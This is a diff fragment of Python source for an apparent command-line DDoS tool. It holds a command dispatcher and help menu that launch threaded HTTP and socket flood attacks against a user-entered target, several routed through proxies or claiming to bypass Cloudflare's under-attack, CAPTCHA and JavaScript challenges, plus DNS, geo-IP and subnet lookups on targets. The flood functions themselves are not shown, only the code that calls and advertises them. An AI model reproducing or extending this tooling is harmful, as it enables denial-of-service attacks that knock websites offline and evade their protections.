+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Methods And Tools  "+Fore.RED+": \x1b[38;2;0;255;189mTCM\n")
+    elif command == "cfb":
+        target, thread, t = get_info()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchCFB(target, thread, t)
+        timer.join()
+    elif command == "pxcfb":
+        if get_proxies():
+            target, thread, t = get_info()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXCFB(target, thread, t)
+            timer.join()
+    elif command == "raw":
+        target, thread, t = get_info()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchRAW(target, thread, t)
+        timer.join()
+    elif command == "post":
+        target, thread, t = get_info()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchPOST(target, thread, t)
+        timer.join()
+    elif command == "head":
+        target, thread, t = get_info()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHEAD(target, thread, t)
+        timer.join()
+    elif command == "pxraw":
+        if get_proxies():
+            target, thread, t = get_info()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXRAW(target, thread, t)
+            timer.join()
+    elif command == "soc":
+        target, thread, t = get_info()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchSOC(target, thread, t)
+        timer.join()
+    elif command == "pxsoc":
+        if get_proxies():
+            target, thread, t = get_info()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXSOC(target, thread, t)
+            timer.join()
+    elif command == "cfpro":
+        target, thread, t = get_info()
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        if get_cookie(target):
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchCFPRO(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+    elif command == "cfsoc":
+        target, thread, t = get_info()
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        if get_cookie(target):
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchCFSOC(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+    elif command == "sky":
+        target, thread, t = get_info()
+        threading.Thread(target=attackSKY, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "stellar":
+        target, thread, t = get_info()
+        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+
+#region TOOLS        
+    elif command == "subnet":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')                   
+            
+    elif command == "dns":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')
+            
+    elif command == "geoip":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')
+    else:
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")
+        #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")      
+#endregion
+
+def func():
+    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
+#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
+#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
+    
+    #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
+    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
+    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
+
+    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
+    
+    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")
+
+if __name__ == '__main__':
+    clear()
+    title()
+    while True:
+        command()
